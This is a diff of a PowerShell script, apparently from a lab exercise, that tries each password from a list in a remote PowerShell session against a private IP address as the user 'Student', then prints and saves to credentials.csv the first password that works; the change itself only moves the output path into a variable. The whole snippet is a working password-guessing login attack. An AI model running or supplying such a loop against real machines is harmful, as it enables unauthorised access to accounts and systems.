@@ -18,12 +18,15 @@ $username = "Student"
 #$ip = "172.16.2.223"
 $ip = "172.16.2.77"
 
+# Define filename + filepath to save to
+$out = "Powershell\credentials.csv"
+
 # Get the first set of credentials from the CSV file
 foreach ($password in $passwords) {
     $securePassword = ConvertTo-SecureString $password -AsPlainText -Force
     $credentialObject = New-Object System.Management.Automation.PSCredential($username, $securePassword)
     # Try to start a new PSSession with the IP address and the credentials
-    $session = New-PSSession -ComputerName $ip -Credential $credentialObject -ErrorAction SilentlyContinue
+    New-PSSession -ComputerName $ip -Credential $credentialObject -ErrorAction SilentlyContinue
 
     if ($?) {
         #Write-Host "New-PSSession succeeded"
@@ -31,7 +34,7 @@ foreach ($password in $passwords) {
         # Print the password and that it succeeded
         Write-Host "Suceeded: $password"
         # Append the username and successful password on a new line in credentials.csv
-        Add-Content -Path "Powershell\credentials.csv" -Value "`r`n$username,$password"
+        Add-Content -Path $out -Value "`r`n$username,$password"
         Write-Host "Added credentials to credentials.csv."
         break
     }
